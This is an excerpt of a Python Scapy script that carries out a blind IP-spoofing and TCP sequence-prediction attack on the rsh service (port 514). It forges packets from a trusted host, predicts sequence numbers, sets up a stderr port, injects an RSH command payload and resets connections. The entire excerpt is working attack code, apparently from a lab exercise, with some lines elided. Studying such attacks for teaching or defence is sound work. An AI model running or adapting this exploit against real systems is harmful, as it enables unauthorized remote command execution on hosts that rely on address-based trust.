...
if __name__ == "__main__":
    ...
    for _ in range(20):
        ...
        stderrLoad = b"\x31\x30\x32\x32\x00" # port 1022
        stderrPack = IP(src=trusted_host_ip, dst=target_ip) / TCP(ack=predictedSeqNum+1, seq=1, sport=randPort2, dport=514, flags="PA") / Raw(load=stderrLoad)
        send(stderrPack, verbose=0)
        ...
        for i in range(20):
            ErrPortAck = IP(src=trusted_host_ip, dst=target_ip) / TCP(ack=predictedSeqNum+128000+1, seq=ErrseqNum, sport=1022, dport=1023-i, flags="SA")
            send(ErrPortAck, verbose=0)
        # Send RSH Payload
        ...
        packet = IP(src=trusted_host_ip, dst=target_ip) / TCP(ack=predictedSeqNum+1, seq=6, sport=randPort2, dport=514, flags="PA") / Raw(load=RSHPayload)
        send(packet, verbose=0)
        time.sleep(0.5)
        ...
        for i in range(20):
            newPack = IP(src=trusted_host_ip, dst=target_ip) / TCP(ack=predictedSeqNum+128000+1, sport=1022, dport=1023-i, flags="R")
            send(newPack,verbose=0)
